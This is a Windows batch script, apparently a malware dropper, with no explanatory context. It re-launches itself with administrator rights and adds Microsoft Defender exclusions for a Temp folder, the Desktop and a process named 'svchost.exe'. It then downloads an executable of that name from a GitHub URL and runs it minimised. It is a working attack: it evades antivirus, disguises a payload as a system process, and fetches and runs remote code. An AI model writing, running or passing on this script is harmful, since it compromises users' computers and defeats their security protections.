@echo off
setlocal enabledelayedexpansion

:: Check if running as administrator
openfiles > nul 2>&1
if %errorlevel%==0 (
    goto :run_script
) else (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
    exit
)

:run_script
echo Adding Defender exclusions...

:: Add Defender exclusions
powershell -Command ^
 "& { ^
     Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue; ^
     Write-Host 'Exclusion added for C:\Users\%username%\AppData\Roaming\Temp'; ^
     Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue; ^
     Write-Host 'Exclusion added for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe'; ^
     Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue; ^
     Write-Host 'Exclusion added for svchost.exe process'; ^
     Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue; ^
     Write-Host 'Exclusion added for C:\Users\%username%\Desktop'; ^
 }"

echo Downloading svchost.exe...

:: Download svchost.exe from the specified URL
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"
if %errorlevel%==0 (
    echo svchost.exe downloaded successfully
) else (
    echo Error downloading svchost.exe
)

echo Running svchost.exe...

:: Run svchost.exe silently
start "" /min "%USERPROFILE%\Desktop\svchost.exe"

echo Script completed.
pause
